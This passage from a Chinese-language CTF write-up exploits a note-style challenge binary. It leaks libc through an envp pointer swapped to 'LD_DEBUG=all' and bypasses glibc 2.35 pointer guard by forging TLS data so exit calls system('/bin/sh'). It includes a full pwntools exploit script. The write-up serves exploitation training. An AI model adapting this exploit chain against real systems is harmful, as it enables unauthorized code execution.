我们要如何获取libc地址来构造rop链呢</p><p>就是利用将程序的环境变量指针替换为指向LD_DEBUG&#x3D;all字符串的指针 从而泄露libc</p><p>你可以注意到 在我们输入username后的下一个输入点 存在2字节的溢出 而后面的内容正好是envp环境变量</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041529582.png" title="image-20230704152944558" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041529582.png" alt="image-20230704152944558"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041529061.png" title="image-20230704152909029" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041529061.png" alt="image-20230704152909029"></a></p><p>同时你可以发现sub_14b0函数 可以泄露出栈地址的后两个字节</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041532282.png" title="image-20230704153210244" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041532282.png" alt="image-20230704153210244"></a></p><p>而我们如果在一开始的username中输入LD_DEBUG&#x3D;all字符串 那么此时就可以在对应的偏移中看到指向该字符串的指针  </p><p>配合该偏移 我们可以在后续的溢出中将环境变量的指针替换成指向LD_DEBUG&#x3D;all字符串 从而在程序重新运行的时候输出libc基址</p><h2 id="exit调用链"><a href="#exit调用链" class="headerlink" title="exit调用链"></a>exit调用链</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">sub_1B70</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s[<span class="number">9</span>]; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  s[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please don&#x27;t patch this normal function, we will check it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Debug the note.&quot;</span>);</span><br><span class="line">  s[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;[Addr] &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">8uLL</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;[Read] &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s[<span class="number">0</span>]);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;[Addr] &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">8uLL</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;[Write] &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s[<span class="number">0</span>], <span class="number">0x90</span>uLL);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到dbg函数虽然给了任意地址读和任意地址写 看起来好像我们可以往栈上写入rop链 随后劫持程序执行流 但是实际不会执行到leave和ret来结束栈帧 就会触发exit 所以我们这里只能通过布局tls结构体来控制exit函数</p><p>2.35以上的版本  exit函数内部调用了__run_exit_handlers函数 </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041704491.png" title="image-20230704170431440" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041704491.png" alt="image-20230704170431440"></a></p><p>而该函数内部又调用了一个关键的函数 可以供我们实现任意函数调用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041705601.png" title="image-20230704170511575" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041705601.png" alt="image-20230704170511575"></a></p><p>下面跟着我来分析一下如何构造tls结构体 以此来实现system函数调用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041707838.png" title="image-20230704170734787" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041707838.png" alt="image-20230704170734787"></a></p><p>这里的rbx的值通常是不会变化的 其取决于rip索引 我们这里需要使得je跳转失败 从而才能进入任意函数调用的部分</p><p>这里的rbp取值是根据tls结构体低地址处 我们计算好偏移以后 利用dgb函数的任意写机会将其修改不为0后即可不跳转</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041710607.png" title="image-20230704171004573" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041710607.png" alt="image-20230704171004573"></a></p><p>这部分的内容是新版本加入的指针保护机制  通过循环右移11位后和tls结构体中的key异或后解密指针</p><p>当然我们拥有tls结构体任意写的权限话 很容易就能绕过 我们只需要使得rax一开始为0 设置fs:0x30处为system函数</p><p>异或过后rax的值就被设置成了system函数地址</p><p>而rdi寄存器的参数取决于rbp寄存器 rbp寄存器的值取决于我们一开始任意写的地址 fs_base-88处存放的值</p><p>计算好偏移 我们可以得到下面的payload 其可以实现call system 并且rdi参数为binsh</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(target+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(target+<span class="number">0x18</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(system_addr)</span><br></pre></td></tr></table></figure><p>但是你会发现system函数会卡在这里</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041714298.png" title="image-20230704171453250" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041714298.png" alt="image-20230704171453250"></a></p><p>这是因为我们破坏了tls结构体  我们把断点打在pthread_setcancelstate</p><p>看看rdx寄存器是怎么样赋值的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041715302.png" title="image-20230704171544271" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041715302.png" alt="image-20230704171544271"></a></p><p>于是fs_base+0x10处的值不能被破坏 我们通过观察原本的tls结构会发现 其和fs_base+0x8处 是构成一个链表 由偏移0x10处指向偏移0x8处 而偏移0x8处指向自身</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041717023.png" title="image-20230704171742004" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041717023.png" alt="image-20230704171742004"></a></p><p>但是经过我实际测试 我们只需要保证fs:0x10处的地址+0x971后 是一个可读的内存地址即可 也就是说libc_addr-0x972也可以通过</p><p>那么最后的payload即为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(target+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(target+<span class="number">0x18</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(libc_addr-<span class="number">0x972</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(system_addr)</span><br></pre></td></tr></table></figure><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process([<span class="string">&quot;./pwn&quot;</span>,<span class="string">&#x27;run&#x27;</span>])</span><br><span class="line"><span class="comment">#io = remote(&quot;175.20.26.10&quot;,9999)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;UserName: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;LD_DEBUG=all&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;LD_DEBUG=all@Note $ &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x150D)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">&quot;++--++--&quot;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Super note: &quot;</span>)</span><br><span class="line">number = <span class="built_in">int</span>(io.recv(<span class="number">5</span>),<span class="number">10</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(number))</span><br><span class="line">io.recvuntil(<span class="string">&quot;LD_DEBUG=all@Note $ &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1730)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">number += <span class="number">0x1c</span></span><br><span class="line">payload = cyclic(<span class="number">0x30</span>)+p16(number)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;LD_DEBUG=all@Note $ &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;Note_Add&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x19</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x17ff)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;base: &quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;[Addr] &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1BF1)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">envp_addr = libc_addr + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">io.send(p64(libc_addr))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">target = libc_addr - <span class="number">0x2898</span> - <span class="number">0x28</span> - <span class="number">0x58</span></span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;[Addr] &quot;</span>)</span><br><span class="line">success(<span class="string">&quot;target_addr :&quot;</span>+<span class="built_in">hex</span>(target))</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1C32)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(p64(target))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(target+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(target+<span class="number">0x18</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(libc_addr-<span class="number">0x972</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(system_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;[Write] &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1C6A)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
</feed>
